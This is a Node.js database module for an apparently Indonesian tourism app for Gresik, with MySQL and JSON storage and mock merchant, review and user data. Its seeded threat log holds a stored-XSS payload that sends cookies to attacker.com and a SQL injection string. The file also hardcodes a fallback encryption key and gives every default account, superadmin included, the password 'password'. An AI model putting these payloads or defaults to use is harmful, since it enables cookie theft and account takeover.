const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const bcrypt = require('bcrypt');

const DB_PATH = path.join(__dirname, 'data', 'database.json');
const ALGORITHM = 'aes-256-cbc';
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'grestripsupersecretkeyforallergies!'; 
const IV_LENGTH = 16;

// AES-256 Encryption
function encrypt(text) {
    if (!text) return '';
    try {
        const iv = crypto.randomBytes(IV_LENGTH);
        const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY.padEnd(32).substring(0, 32)), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    } catch (e) {
        console.error('Encryption failed:', e);
        return text;
    }
}

// AES-256 Decryption
function decrypt(ciphertext) {
    if (!ciphertext || !ciphertext.includes(':')) return ciphertext;
    try {
        const parts = ciphertext.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encryptedText = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv(ALGORITHM, Buffer.from(ENCRYPTION_KEY.padEnd(32).substring(0, 32)), iv);
        let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        console.error('Decryption failed:', e.message);
        return '[Terdekripsi Gagal]';
    }
}

// Initial Mock Data Structure
const initialData = {
    merchants: [
        {
            id: "m1",
            name: "Nasi Krawu Bu Azza",
            owner: "Ibu Azza",
            type: "kuliner",
            description: "Nasi Krawu legendaris khas Gresik dengan suwiran daging sapi empuk, serundeng manis pedas, dan sambal petis super nikmat.",
            coords: [-7.1610, 112.6565],
            rating: 4.8,
            reviewsCount: 3,
            catalog: [
                { id: "c1_1", name: "Nasi Krawu Daging", price: 20000, description: "Nasi pulen hangat disajikan di atas daun pisang dengan suwiran daging sapi gurih." },
                { id: "c1_2", name: "Nasi Krawu Babat Paru", price: 22000, description: "Kombinasi babat dan paru goreng bumbu rempah melimpah." },
                { id: "c1_3", name: "Es Sinom Khas Gresik", price: 5000, description: "Minuman herbal segar dari daun asam muda dan kunyit asli." }
            ]
        },
        {
            id: "m2",
            name: "Otak-otak Bandeng Pak Elan II",
            owner: "Pak Elan",
            type: "kuliner",
            description: "Bandeng tanpa duri legendaris yang dibakar sempurna dengan isian daging bandeng cincang berbumbu rahasia warisan leluhur.",
            coords: [-7.1642, 112.6450],
            rating: 4.7,
            reviewsCount: 2,
            catalog: [
                { id: "c2_1", name: "Otak-otak Bandeng Bakar (Utuh)", price: 65000, description: "Satu ekor bandeng utuh tanpa duri isi otak-otak panggang wangi." },
                { id: "c2_2", name: "Bandeng Asap Khas Gresik", price: 70000, description: "Bandeng asap wangi gurih, oleh-oleh favorit nomor satu." }
            ]
        },
        {
            id: "m3",
            name: "Warung Kopi Amak (Kopi Kasar)",
            owner: "Cak Amak",
            type: "kuliner",
            description: "Tempat nongkrong ikonik Gresik yang menyajikan kopi tubruk kasar khas, diseduh langsung dari biji kopi robusta pilihan.",
            coords: [-7.1585, 112.6520],
            rating: 4.6,
            reviewsCount: 2,
            catalog: [
                { id: "c3_1", name: "Kopi Kasar Cangkir", price: 4000, description: "Kopi robusta tubruk dengan ampas kasar yang bisa diseruput nikmat." },
                { id: "c3_2", name: "Kopi Susu Kasar", price: 6000, description: "Kopi kasar dipadukan dengan kental manis gurih." }
            ]
        },
        {
            id: "m4",
            name: "Situs Sejarah Giri Kedaton",
            owner: "Pengelola Dinas Pariwisata",
            type: "wisata",
            description: "Situs arkeologi pusat kerajaan Islam pertama di Jawa yang didirikan oleh Sunan Giri, menawarkan panorama kota Gresik dari atas bukit.",
            coords: [-7.1812, 112.6322],
            rating: 4.9,
            reviewsCount: 1,
            catalog: [
                { id: "c4_1", name: "Tiket Masuk Domestik", price: 5000, description: "Akses ke situs cagar budaya Giri Kedaton." },
                { id: "c4_2", name: "Pemandu Sejarah Lokal", price: 50000, description: "Tur edukasi sejarah kerajaan Islam Giri Kedaton selama 1 jam." }
            ]
        },
        {
            id: "m5",
            name: "Pantai Pasir Putih Dalegan",
            owner: "Kelompok Sadar Wisata Dalegan",
            type: "wisata",
            description: "Pantai pasir putih dengan ombak yang tenang dan sangat aman untuk rekreasi keluarga serta wahana air di ujung utara Gresik.",
            coords: [-6.9015, 112.5020],
            rating: 4.5,
            reviewsCount: 1,
            catalog: [
                { id: "c5_1", name: "Tiket Masuk Pantai", price: 10000, description: "Tiket terusan rekreasi area pantai pasir putih." },
                { id: "c5_2", name: "Sewa Gazebo Pantai", price: 25000, description: "Sewa saung santai di pinggir pantai durasi sepuasnya." }
            ]
        }
    ],
    reviews: [
        { id: "r1", merchantId: "m1", userName: "Ahmad_Tour", rating: 5, text: "Nasi krawunya enak sekali! Dagingnya empuk dan serundengnya manis pas. Wajib coba bagi wisatawan.", timestamp: "2026-05-20T10:15:30Z" },
        { id: "r2", merchantId: "m1", userName: "Budi Santoso", rating: 4, text: "Rasa hidangan disukai 90%, pelayanan dinilai agak sedikit lambat saat jam makan siang padat.", timestamp: "2026-05-21T12:00:00Z" },
        { id: "r3", merchantId: "m1", userName: "Lia_Traveler", rating: 5, text: "Sambalnya mantap betul! Tempatnya bersih dan pelayanannya ramah.", timestamp: "2026-05-22T08:30:00Z" },
        { id: "r4", merchantId: "m2", userName: "Roni_Kuliner", rating: 5, text: "Otak-otaknya tiada tanding. Rasa bumbu bandengnya meresap sampai ke dalam, dagingnya tebal.", timestamp: "2026-05-23T14:45:00Z" },
        { id: "r5", merchantId: "m2", userName: "Santi Kartika", rating: 4, text: "Sangat lezat, namun sayangnya tempat parkir roda empat agak terbatas.", timestamp: "2026-05-24T17:10:00Z" },
        { id: "r6", merchantId: "m3", userName: "WarkopLover", rating: 5, text: "Kopi kasar terbaik se-Gresik. Aromanya kuat dan rasanya sangat autentik merakyat.", timestamp: "2026-05-23T20:00:00Z" },
        { id: "r7", merchantId: "m3", userName: "Mega Prasetya", rating: 4, text: "Tempat nongkrong yang asik buat ngobrol santai sambil ngopi kasar malam hari.", timestamp: "2026-05-24T22:30:00Z" },
        { id: "r8", merchantId: "m4", userName: "SejarahLover", rating: 5, text: "Situs bersejarah yang sangat terawat. Pemandangannya indah dari bukit Giri.", timestamp: "2026-05-25T09:00:00Z" },
        { id: "r9", merchantId: "m5", userName: "KeluargaCeria", rating: 5, text: "Pasir putihnya bersih, ombaknya bersahabat untuk anak-anak bermain air.", timestamp: "2026-05-25T11:45:00Z" }
    ],
    threats: [
        { id: "t1", ip: "103.45.12.89", timestamp: "2026-05-25T14:22:10Z", type: "Stored XSS", payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", severity: "HIGH", action: "BLOCKED" },
        { id: "t2", ip: "182.253.90.11", timestamp: "2026-05-25T16:45:33Z", type: "SQL Injection", payload: "' OR '1'='1' --", severity: "HIGH", action: "BLOCKED" },
        { id: "t3", ip: "114.79.2.45", timestamp: "2026-05-26T02:11:05Z", type: "Cyberbullying / Profanity", payload: "Warung bangsat pelayanan kayak tahi babi!", severity: "MEDIUM", action: "BLOCKED" }
    ],
    users: [
        { username: "wisatawan", password: bcrypt.hashSync("password", 10), role: "wisatawan", fullname: "Budi Wisatawan" },
        { username: "umkm", password: bcrypt.hashSync("password", 10), role: "umkm", fullname: "Haji Azza (Pemilik UMKM)" },
        { username: "itsec", password: bcrypt.hashSync("password", 10), role: "itsec", fullname: "Satria IT Cybersec" },
        { username: "admin", password: bcrypt.hashSync("password", 10), role: "superadmin", fullname: "Dinas Pariwisata Gresik" }
    ],
    cache: {}
};

// -------------------------------------------------------------
// DUAL-MODE DATABASE CONFIGURATION (MySQL + JSON Fallback)
// -------------------------------------------------------------
let mysqlPool = null;
let useMySQL = false;

async function connectMySQL() {
    const dbHost = process.env.DB_HOST;
    const dbUser = process.env.DB_USER;
    const dbPassword = process.env.DB_PASSWORD;
    const dbName = process.env.DB_NAME;

    if (!dbHost || !dbUser || !dbName) {
        console.warn("[Database] MySQL credentials missing in .env. Falling back to persistent JSON-file DB mode.");
        return false;
    }

    try {
        const mysql = require('mysql2/promise');
        
        // 1. Connect to MySQL server first (without database selected) to create the DB if missing
        console.log(`[Database] Connecting to MySQL server at ${dbHost} to verify/create database...`);
        const tempConn = await mysql.createConnection({
            host: dbHost,
            user: dbUser,
            password: dbPassword
        });

        // 2. Automatically create database if not exists
        await tempConn.query(`CREATE DATABASE IF NOT EXISTS \`${dbName}\``);
        await tempConn.end();
        console.log(`[Database] Database '${dbName}' verified/created successfully!`);

        // 3. Connect the pool to the database
        mysqlPool = mysql.createPool({
            host: dbHost,
            user: dbUser,
            password: dbPassword,
            database: dbName,
            waitForConnections: true,
            connectionLimit: 10,
            queueLimit: 0
        });

        // Test connection
        const conn = await mysqlPool.getConnection();
        conn.release();
        
        console.log(`[Database] Successfully connected to MySQL Pool at ${dbHost} for '${dbName}'!`);
        useMySQL = true;
        await bootstrapMySQLSchema();
        return true;
    } catch (e) {
        console.error(`[Database Error] MySQL failed to connect or create database: ${e.message}. Falling back to persistent JSON DB.`);
        mysqlPool = null;
        useMySQL = false;
        return false;
    }
}

async function bootstrapMySQLSchema() {
    if (!useMySQL || !mysqlPool) return;
    try {
        console.log("[Database] Bootstrapping MySQL schemas...");
        
        // 1. Merchants Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS merchants (
                id VARCHAR(50) PRIMARY KEY,
                name VARCHAR(255) NOT NULL,
                owner VARCHAR(255) NOT NULL,
                type VARCHAR(50) NOT NULL,
                description TEXT,
                coords_lat DOUBLE NOT NULL,
                coords_lng DOUBLE NOT NULL,
                rating FLOAT DEFAULT 5.0,
                reviewsCount INT DEFAULT 0,
                catalog TEXT
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 2. Reviews Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS reviews (
                id VARCHAR(50) PRIMARY KEY,
                merchantId VARCHAR(50) NOT NULL,
                userName VARCHAR(255) NOT NULL,
                rating INT NOT NULL,
                text TEXT,
                timestamp VARCHAR(100) NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 3. Threats Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS threats (
                id VARCHAR(50) PRIMARY KEY,
                ip VARCHAR(100) NOT NULL,
                timestamp VARCHAR(100) NOT NULL,
                type VARCHAR(100) NOT NULL,
                payload TEXT,
                severity VARCHAR(50) NOT NULL,
                action VARCHAR(50) DEFAULT 'BLOCKED'
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 4. Cache Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS itinerary_cache (
                hash_key VARCHAR(64) PRIMARY KEY,
                expiry VARCHAR(100) NOT NULL,
                value LONGTEXT NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // 5. Users Table
        await mysqlPool.query(`
            CREATE TABLE IF NOT EXISTS users (
                username VARCHAR(50) PRIMARY KEY,
                password VARCHAR(255) NOT NULL,
                role VARCHAR(50) NOT NULL,
                fullname VARCHAR(255) NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        `);

        // Check if merchants table is empty to populate mock
        const [rows] = await mysqlPool.query("SELECT COUNT(*) as count FROM merchants");
        if (rows[0].count === 0) {
            console.log("[Database] Seeding initial mock data into MySQL tables...");
            
            // Seed Merchants
            for (const m of initialData.merchants) {
                await mysqlPool.query(
                    "INSERT INTO merchants (id, name, owner, type, description, coords_lat, coords_lng, rating, reviewsCount, catalog) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    [m.id, m.name, m.owner, m.type, m.description, m.coords[0], m.coords[1], m.rating, m.reviewsCount, JSON.stringify(m.catalog)]
                );
            }

            // Seed Reviews
            for (const r of initialData.reviews) {
                await mysqlPool.query(
                    "INSERT INTO reviews (id, merchantId, userName, rating, text, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                    [r.id, r.merchantId, r.userName, r.rating, r.text, r.timestamp]
                );
            }

            // Seed Threats
            for (const t of initialData.threats) {
                await mysqlPool.query(
                    "INSERT INTO threats (id, ip, timestamp, type, payload, severity, action) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    [t.id, t.ip, t.timestamp, t.type, t.payload, t.severity, t.action]
                );
            }

            console.log("[Database] Merchants, reviews, threats seeded.");
        }

        // Always ensure default users exist (independent of merchants seed state)
        const [userRows] = await mysqlPool.query("SELECT COUNT(*) as count FROM users");
        if (userRows[0].count === 0) {
            console.log("[Database] Seeding default user accounts...");
            for (const u of initialData.users) {
                await mysqlPool.query(
                    "INSERT IGNORE INTO users (username, password, role, fullname) VALUES (?, ?, ?, ?)",
                    [u.username, u.password, u.role, u.fullname]
                );
            }
            console.log("[Database] Default user accounts seeded.");
        }
    } catch (err) {
        console.error("[Database Error] Bootstrapping failed:", err.message);
    }
}

// -------------------------------------------------------------
// JSON FILE DATABASE CONSOLE ENGINE (FALLBACK)
// -------------------------------------------------------------
function loadJsonDb() {
    if (!fs.existsSync(DB_PATH)) {
        saveJsonDb(initialData);
        return initialData;
    }
    try {
        const raw = fs.readFileSync(DB_PATH, 'utf8');
        return JSON.parse(raw);
    } catch (e) {
        console.error("Failed to read JSON DB, using initial data:", e);
        return initialData;
    }
}

function saveJsonDb(data) {
    try {
        const tempPath = DB_PATH + '.tmp';
        fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf8');
        fs.renameSync(tempPath, DB_PATH);
        return true;
    } catch (e) {
        console.error("JSON atomic write failed, writing directly:", e);
        try {
            fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), 'utf8');
            return true;
        } catch (err) {
            return false;
        }
    }
}

// Initialize Dual Connection
connectMySQL();

// -------------------------------------------------------------
// UNIFIED PUBLIC DATABASE INTERFACE
// -------------------------------------------------------------
const db = {
    // 1. Get Merchants
    getMerchants: async () => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM merchants");
                return rows.map(r => ({
                    id: r.id,
                    name: r.name,
                    owner: r.owner,
                    type: r.type,
                    description: r.description,
                    coords: [r.coords_lat, r.coords_lng],
                    rating: r.rating,
                    reviewsCount: r.reviewsCount,
                    catalog: JSON.parse(r.catalog || '[]')
                }));
            } catch (e) {
                console.error("MySQL query failed, falling back to JSON:", e);
            }
        }
        
        // JSON Fallback
        const data = loadJsonDb();
        return data.merchants;
    },

    // 2. Get Merchant By Id
    getMerchantById: async (id) => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM merchants WHERE id = ?", [id]);
                if (rows.length > 0) {
                    const r = rows[0];
                    return {
                        id: r.id,
                        name: r.name,
                        owner: r.owner,
                        type: r.type,
                        description: r.description,
                        coords: [r.coords_lat, r.coords_lng],
                        rating: r.rating,
                        reviewsCount: r.reviewsCount,
                        catalog: JSON.parse(r.catalog || '[]')
                    };
                }
                return null;
            } catch (e) {
                console.error("MySQL query failed:", e);
            }
        }

        const data = loadJsonDb();
        return data.merchants.find(m => m.id === id);
    },

    // 3. Add Merchant
    addMerchant: async (merchant) => {
        const id = 'm_' + Date.now();
        const catalog = merchant.catalog || [];
        const rating = 5.0;
        const reviewsCount = 0;

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO merchants (id, name, owner, type, description, coords_lat, coords_lng, rating, reviewsCount, catalog) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    [id, merchant.name, merchant.owner, merchant.type, merchant.description, merchant.coords[0], merchant.coords[1], rating, reviewsCount, JSON.stringify(catalog)]
                );
                return { id, rating, reviewsCount, catalog, ...merchant };
            } catch (e) {
                console.error("MySQL insert failed:", e);
            }
        }

        const data = loadJsonDb();
        const newMerchant = { id, rating, reviewsCount, catalog, ...merchant };
        data.merchants.push(newMerchant);
        saveJsonDb(data);
        return newMerchant;
    },

    // 4. Update Catalog
    updateMerchantCatalog: async (merchantId, catalog) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("UPDATE merchants SET catalog = ? WHERE id = ?", [JSON.stringify(catalog), merchantId]);
                return await db.getMerchantById(merchantId);
            } catch (e) {
                console.error("MySQL update failed:", e);
            }
        }

        const data = loadJsonDb();
        const index = data.merchants.findIndex(m => m.id === merchantId);
        if (index !== -1) {
            data.merchants[index].catalog = catalog;
            saveJsonDb(data);
            return data.merchants[index];
        }
        return null;
    },

    // 4.5 Update Merchant Details (Super Admin edit/toggle)
    updateMerchant: async (merchantId, updated) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "UPDATE merchants SET name = ?, owner = ?, type = ?, description = ?, coords_lat = ?, coords_lng = ?, status = ? WHERE id = ?",
                    [updated.name, updated.owner, updated.type, updated.description, parseFloat(updated.coords[0]), parseFloat(updated.coords[1]), updated.status || 'aktif', merchantId]
                );
                return await db.getMerchantById(merchantId);
            } catch (e) {
                console.warn("MySQL update merchant failed (potentially missing status column), falling back without status column:", e);
                try {
                    await mysqlPool.query(
                        "UPDATE merchants SET name = ?, owner = ?, type = ?, description = ?, coords_lat = ?, coords_lng = ? WHERE id = ?",
                        [updated.name, updated.owner, updated.type, updated.description, parseFloat(updated.coords[0]), parseFloat(updated.coords[1]), merchantId]
                    );
                    return await db.getMerchantById(merchantId);
                } catch (err2) {
                    console.error("MySQL backup merchant update failed:", err2);
                }
            }
        }

        const data = loadJsonDb();
        const index = data.merchants.findIndex(m => m.id === merchantId);
        if (index !== -1) {
            data.merchants[index] = {
                ...data.merchants[index],
                ...updated,
                coords: [parseFloat(updated.coords[0]), parseFloat(updated.coords[1])]
            };
            saveJsonDb(data);
            return data.merchants[index];
        }
        return null;
    },

    // 5. Get Reviews
    getReviews: async (merchantId = null) => {
        if (useMySQL && mysqlPool) {
            try {
                let query = "SELECT * FROM reviews ORDER BY timestamp DESC";
                let params = [];
                if (merchantId) {
                    query = "SELECT * FROM reviews WHERE merchantId = ? ORDER BY timestamp DESC";
                    params = [merchantId];
                }
                const [rows] = await mysqlPool.query(query, params);
                return rows;
            } catch (e) {
                console.error("MySQL query failed:", e);
            }
        }

        const data = loadJsonDb();
        if (merchantId) {
            return data.reviews.filter(r => r.merchantId === merchantId);
        }
        return data.reviews;
    },

    // 6. Add Review
    addReview: async (review) => {
        const id = 'r_' + Date.now();
        const timestamp = new Date().toISOString();

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO reviews (id, merchantId, userName, rating, text, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                    [id, review.merchantId, review.userName, review.rating, review.text, timestamp]
                );

                // Re-calculate average rating for merchant
                const [reviewsRows] = await mysqlPool.query("SELECT rating FROM reviews WHERE merchantId = ?", [review.merchantId]);
                const count = reviewsRows.length;
                const sum = reviewsRows.reduce((acc, curr) => acc + curr.rating, 0);
                const avgRating = parseFloat((sum / count).toFixed(1));

                await mysqlPool.query(
                    "UPDATE merchants SET rating = ?, reviewsCount = ? WHERE id = ?",
                    [avgRating, count, review.merchantId]
                );

                return { id, timestamp, ...review };
            } catch (e) {
                console.error("MySQL review insertion failed:", e);
            }
        }

        const data = loadJsonDb();
        const newReview = { id, timestamp, ...review };
        data.reviews.unshift(newReview);

        // Update merchant average
        const merchant = data.merchants.find(m => m.id === review.merchantId);
        if (merchant) {
            const mReviews = data.reviews.filter(r => r.merchantId === review.merchantId);
            merchant.reviewsCount = mReviews.length;
            const sum = mReviews.reduce((acc, curr) => acc + curr.rating, 0);
            merchant.rating = parseFloat((sum / mReviews.length).toFixed(1));
        }

        saveJsonDb(data);
        return newReview;
    },

    // 7. Get Cybersecurity threats siber logs
    getThreats: async () => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM threats ORDER BY timestamp DESC");
                return rows;
            } catch (e) {
                console.error("MySQL threats select failed:", e);
            }
        }

        const data = loadJsonDb();
        return data.threats;
    },

    // 8. Add siber threat log
    addThreat: async (threat) => {
        const id = 't_' + Date.now();
        const timestamp = new Date().toISOString();
        const action = 'BLOCKED';

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO threats (id, ip, timestamp, type, payload, severity, action) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    [id, threat.ip, timestamp, threat.type, threat.payload, threat.severity, action]
                );
                return { id, timestamp, action, ...threat };
            } catch (e) {
                console.error("MySQL threat insert failed:", e);
            }
        }

        const data = loadJsonDb();
        const newThreat = { id, timestamp, action, ...threat };
        data.threats.unshift(newThreat);
        saveJsonDb(data);
        return newThreat;
    },

    // 9. Get Itinerary Cache (Smart cache)
    getItineraryCache: async (params) => {
        const key = crypto.createHash('sha256').update(JSON.stringify(params)).digest('hex');
        
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM itinerary_cache WHERE hash_key = ?", [key]);
                if (rows.length > 0) {
                    const cached = rows[0];
                    if (new Date(cached.expiry) > new Date()) {
                        console.log(`[Cache Hit - MySQL] Serving cached itinerary for key: ${key}`);
                        return JSON.parse(cached.value);
                    } else {
                        console.log(`[Cache Expired - MySQL] Evicting key: ${key}`);
                        await mysqlPool.query("DELETE FROM itinerary_cache WHERE hash_key = ?", [key]);
                    }
                }
                return null;
            } catch (e) {
                console.error("MySQL cache select failed:", e);
            }
        }

        const data = loadJsonDb();
        const cached = data.cache[key];
        if (cached) {
            if (new Date(cached.expiry) > new Date()) {
                console.log(`[Cache Hit - JSON] Serving cached itinerary for key: ${key}`);
                return cached.value;
            } else {
                console.log(`[Cache Expired - JSON] Evicting key: ${key}`);
                delete data.cache[key];
                saveJsonDb(data);
            }
        }
        return null;
    },

    // 10. Set Itinerary Cache
    setItineraryCache: async (params, value, ttlHours = 24) => {
        const key = crypto.createHash('sha256').update(JSON.stringify(params)).digest('hex');
        const expiry = new Date();
        expiry.setHours(expiry.getHours() + ttlHours);
        const expiryStr = expiry.toISOString();

        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO itinerary_cache (hash_key, expiry, value) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE expiry = ?, value = ?",
                    [key, expiryStr, JSON.stringify(value), expiryStr, JSON.stringify(value)]
                );
                console.log(`[Cache Miss - MySQL] Caching itinerary under key: ${key} (Expires: ${expiryStr})`);
                return true;
            } catch (e) {
                console.error("MySQL cache insert failed:", e);
            }
        }

        const data = loadJsonDb();
        data.cache[key] = {
            expiry: expiryStr,
            value: value
        };
        saveJsonDb(data);
        console.log(`[Cache Miss - JSON] Caching itinerary under key: ${key} (Expires: ${expiryStr})`);
        return true;
    },

    // User Authentication Helpers
    getUser: async (username) => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM users WHERE username = ?", [username]);
                if (rows.length > 0) return rows[0];
                return null;
            } catch (e) {
                console.error("MySQL getUser failed:", e);
            }
        }

        const data = loadJsonDb();
        if (!data.users) data.users = [];
        return data.users.find(u => u.username === username) || null;
    },

    addUser: async (user) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query(
                    "INSERT INTO users (username, password, role, fullname) VALUES (?, ?, ?, ?)",
                    [user.username, user.password, user.role, user.fullname]
                );
                return user;
            } catch (e) {
                console.error("MySQL addUser failed:", e);
            }
        }

        const data = loadJsonDb();
        if (!data.users) data.users = [];
        data.users.push(user);
        saveJsonDb(data);
        return user;
    },

    updateUserPassword: async (username, hashedPassword) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("UPDATE users SET password = ? WHERE username = ?", [hashedPassword, username]);
                return true;
            } catch (e) {
                console.error("MySQL updateUserPassword failed:", e);
            }
        }

        const data = loadJsonDb();
        if (!data.users) data.users = [];
        const index = data.users.findIndex(u => u.username === username);
        if (index !== -1) {
            data.users[index].password = hashedPassword;
            saveJsonDb(data);
            return true;
        }
        return false;
    },

    // New CRUD & Admin additions
    getUsers: async () => {
        if (useMySQL && mysqlPool) {
            try {
                const [rows] = await mysqlPool.query("SELECT * FROM users");
                return rows;
            } catch (e) {
                console.error("MySQL getUsers failed:", e);
            }
        }
        const data = loadJsonDb();
        return data.users || [];
    },

    saveUsers: async (users) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM users");
                for (const u of users) {
                    await mysqlPool.query(
                        "INSERT INTO users (username, password, role, fullname) VALUES (?, ?, ?, ?)",
                        [u.username, u.password, u.role, u.fullname]
                    );
                }
                return true;
            } catch (e) {
                console.error("MySQL saveUsers failed:", e);
            }
        }
        const data = loadJsonDb();
        data.users = users;
        saveJsonDb(data);
        return true;
    },

    saveReviews: async (reviews) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM reviews");
                for (const r of reviews) {
                    await mysqlPool.query(
                        "INSERT INTO reviews (id, merchantId, userName, rating, text, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                        [r.id, r.merchantId, r.userName, r.rating, r.text, r.timestamp]
                    );
                }
                return true;
            } catch (e) {
                console.error("MySQL saveReviews failed:", e);
            }
        }
        const data = loadJsonDb();
        data.reviews = reviews;
        saveJsonDb(data);
        return true;
    },

    saveThreats: async (threats) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM threats");
                for (const t of threats) {
                    await mysqlPool.query(
                        "INSERT INTO threats (id, ip, timestamp, type, payload, severity, action) VALUES (?, ?, ?, ?, ?, ?, ?)",
                        [t.id, t.ip, t.timestamp, t.type, t.payload, t.severity, t.action || 'BLOCKED']
                    );
                }
                return true;
            } catch (e) {
                console.error("MySQL saveThreats failed:", e);
            }
        }
        const data = loadJsonDb();
        data.threats = threats;
        saveJsonDb(data);
        return true;
    },

    deleteMerchant: async (merchantId) => {
        if (useMySQL && mysqlPool) {
            try {
                await mysqlPool.query("DELETE FROM merchants WHERE id = ?", [merchantId]);
                await mysqlPool.query("DELETE FROM reviews WHERE merchantId = ?", [merchantId]);
                return true;
            } catch (e) {
                console.error("MySQL deleteMerchant failed:", e);
            }
        }
        const data = loadJsonDb();
        data.merchants = data.merchants.filter(m => m.id !== merchantId);
        data.reviews = data.reviews.filter(r => r.merchantId !== merchantId);
        saveJsonDb(data);
        return true;
    },

    // Encryption Helpers
    encryptField: (text) => encrypt(text),
    decryptField: (ciphertext) => decrypt(ciphertext)
};

module.exports = db;
